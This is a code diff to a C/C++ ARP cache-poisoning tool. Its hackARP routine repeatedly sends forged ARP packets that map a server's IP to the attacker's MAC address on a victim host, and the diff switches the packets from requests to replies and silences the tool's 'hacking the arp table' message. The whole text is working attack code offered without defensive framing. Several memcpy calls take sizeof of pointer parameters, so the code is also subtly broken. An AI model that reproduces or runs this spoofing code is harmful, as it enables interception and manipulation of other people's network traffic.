@@ -47,10 +47,6 @@ int hackARP(char* device, uint8_t* server_ip, uint8_t* victim_ip) {
   uint8_t victim_mac[6];
   getMAC(victim_ip, victim_mac);
 
-  // get the server mac
-  uint8_t server_mac[6];
-  getMAC(server_ip, server_mac);
-
   // allocate as much as the header size
   struct ether_header ether;
   struct ether_arp arp;
@@ -79,7 +75,7 @@ int hackARP(char* device, uint8_t* server_ip, uint8_t* victim_ip) {
 
   // send the packet
   while(1) {
-    cout << "hacking the arp table..." << endl;
+    // cout << "hacking the arp table..." << endl;
     pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));
     usleep(100000);
   }
@@ -157,11 +153,11 @@ void makeEther(struct ether_header* ether, uint8_t* attacker_mac, uint8_t* victi
   ether->ether_type = htons(type);
 
   // Print
-  // cout << "ether->ehter_dhost: ";
-  // printMAC(ether->ether_dhost, 6);
-  // cout << "ether->ehter_shost: ";
-  // printMAC(ether->ether_shost, 6);
-  // printf("ether->ether_type: %04x\n", ether->ether_type);
+  cout << "ether->ether_dhost: ";
+  printMAC(ether->ether_dhost, 6);
+  cout << "ether->ether_shost: ";
+  printMAC(ether->ether_shost, 6);
+  printf("ether->ether_type: %04x\n", ether->ether_type);
 }
 
 void makeArp(struct ether_arp* arp, uint8_t* server_ip, uint8_t* victim_ip, uint8_t* attacker_mac, uint8_t* victim_mac) {
@@ -170,7 +166,7 @@ void makeArp(struct ether_arp* arp, uint8_t* server_ip, uint8_t* victim_ip, uint
   unsigned short int ar_pro = 0x0800;
   unsigned char ar_hln = 0x06;
   unsigned char ar_pln = 0x04;
-  unsigned short int ar_op = 0x0001;
+  unsigned short int ar_op = 0x0002;
   // uint8_t arp_sha[6] = {0x00, 0x0c, 0x29, 0xd6, 0x99, 0x0d};
   // u_int8_t sender_ip[4] = ip;
   uint8_t arp_tha[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
@@ -184,11 +180,8 @@ void makeArp(struct ether_arp* arp, uint8_t* server_ip, uint8_t* victim_ip, uint
   arp->ea_hdr.ar_op = htons(ar_op);
   memcpy(arp->arp_sha, attacker_mac, sizeof(attacker_mac));
   memcpy(arp->arp_spa, server_ip, sizeof(server_ip));
-  // memcpy(arp->sender_ip, sender_ip, sizeof(sender_ip));
   memcpy(arp->arp_tha, victim_mac, sizeof(victim_mac));
-  // memcpy(arp->arp_tha, target_mac, sizeof(target_mac));
   memcpy(arp->arp_tpa, victim_ip, sizeof(victim_ip));
-  // memcpy(arp->target_ip, target_ip, sizeof(target_ip));
 
   // Print
   // printf("arp->ea_hdr.ar_hrd: %04x\n", arp->ea_hdr.ar_hrd);
